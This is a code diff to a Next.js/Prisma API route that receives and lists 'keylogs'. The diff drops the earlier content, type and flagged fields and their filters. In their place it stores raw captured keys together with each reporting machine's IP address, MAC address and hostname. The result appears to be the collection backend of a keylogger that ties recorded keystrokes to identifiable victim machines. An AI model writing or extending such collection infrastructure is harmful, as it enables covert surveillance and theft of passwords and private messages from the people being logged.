@@ -5,8 +5,6 @@ export async function GET(request: Request) {
   try {
     const url = new URL(request.url);
     const deviceId = url.searchParams.get("deviceId");
-    const type = url.searchParams.get("type");
-    const flagged = url.searchParams.get("flagged");
     const limit = url.searchParams.get("limit")
       ? Number.parseInt(url.searchParams.get("limit")!)
       : 100;
@@ -19,14 +17,6 @@ export async function GET(request: Request) {
 
     if (deviceId) {
       where.deviceId = deviceId;
-    }
-
-    if (type) {
-      where.type = type;
-    }
-
-    if (flagged !== null && flagged !== undefined) {
-      where.flagged = flagged === "true";
     }
 
     // Fetch keylogs from the database using Prisma
@@ -56,9 +46,7 @@ export async function GET(request: Request) {
       device: keylog.device?.name || "Unknown Device",
       deviceId: keylog.deviceId,
       timestamp: keylog.timestamp.toISOString(),
-      type: keylog.type,
-      content: keylog.content,
-      flagged: keylog.flagged,
+      keys: keylog.keys,
     }));
 
     return NextResponse.json({
@@ -88,12 +76,11 @@ export async function POST(request: Request) {
     const data = await request.json();
 
     // Validate required fields
-    if (!data.deviceId || !data.content || !data.type) {
+    if (!data.keys) {
       return NextResponse.json(
         {
           success: false,
-          message:
-            "Missing required fields: deviceId, content, and type are required",
+          message: "missing keys",
         },
         { status: 400 },
       );
@@ -103,32 +90,17 @@ export async function POST(request: Request) {
     const keylog = await prisma.keylog.create({
       data: {
         deviceId: data.deviceId,
-        content: data.content,
-        type: data.type,
-        flagged: data.flagged || false,
+        keys: data.keys,
+        ip: data.ip,
+        mac: data.mac,
+        hostname: data.hostname,
         timestamp: data.timestamp ? new Date(data.timestamp) : new Date(),
-      },
-      include: {
-        device: {
-          select: {
-            name: true,
-          },
-        },
       },
     });
 
     return NextResponse.json({
       success: true,
       message: "Keylog created successfully",
-      keylog: {
-        id: keylog.id,
-        device: keylog.device?.name || "Unknown Device",
-        deviceId: keylog.deviceId,
-        timestamp: keylog.timestamp.toISOString(),
-        type: keylog.type,
-        content: keylog.content,
-        flagged: keylog.flagged,
-      },
     });
   } catch (error) {
     console.error("Error creating keylog:", error);
